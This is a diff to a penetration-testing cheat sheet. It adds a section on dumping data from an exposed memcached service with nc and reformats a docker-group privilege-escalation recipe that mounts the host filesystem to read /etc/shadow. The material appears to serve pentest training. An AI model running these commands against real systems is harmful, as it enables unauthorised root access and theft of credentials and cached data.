@@ -34,6 +34,7 @@ Table of Contents
       * [Adding Firewall rules](#adding-firewall-rules)
    * [PrivEsc on Linux](#privesc-on-linux)
       * [From Docker group to root](#from-docker-group-to-root)
+      * [Retrieving data from MemCache](#retrieving-data-from-memcache)
    * [Pivoting](#pivoting)
       * [Local Port Forward with Netsh](#local-port-forward-with-netsh)
    * [EternalBlue Vulnerabilities exploitation](#eternalblue-vulnerabilities-exploitation)
@@ -281,7 +282,8 @@ The following command will create a rule in the Firewall list that will allow th
 netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=[LOCAL-IP] localport=4445 action=allow
 ```
 
-# From Docker group to root
+# Privesc on Linux
+## From Docker group to root
 ```bash
 # First look for which dockers are installed in the system
 docker image ls
@@ -290,6 +292,24 @@ docker image ls
 docker run -v /:/mnt/pwned -ti [IMAGE_NAME]
 
 # Once executed, we should see a shell like this "root@2eb410b54824". At that step we have only to navigate to "/mnt/pwned" and we will see the target victim file system. So we can see privileges files like /etc/shadow.
+```
+
+## Retrieving data from MemCache
+In the privesc phase, we should enumerate the services running on the victim's machine. If we see the port 11211 opened we can try to get valuable data from this service. It is usefull also to check the processes being ran in the system with a *"ps aux"*. The way to enumerate and get data is as follows:
+
+```bash
+# Get MemCache's version
+echo "version" | nc -n [IP] 11211
+# Get the status, there will be answered some configuration values
+echo "stats" | nc -n [IP] 11211
+# Get Slabs
+echo "stats slabs" | nc -n [IP] 11211
+# Get the Slabs items and information about
+echo "stats items" | nc -n [IP] 11211
+# Get key names, it is maybe the most useful because it will gives you if there is any "object" being cached by MemCached to try to retrieve data from.
+echo "stats cachedump [NUMBER] 0" | nc -n [IP] 11211
+# If any object is being cached, we should see some items with their names. This is the moment to check for useful information, just doing:
+echo "get [ITEM_NAME]" | nc -vn [IP] 11211  #Get saved info
 ```
 
 # Pivoting
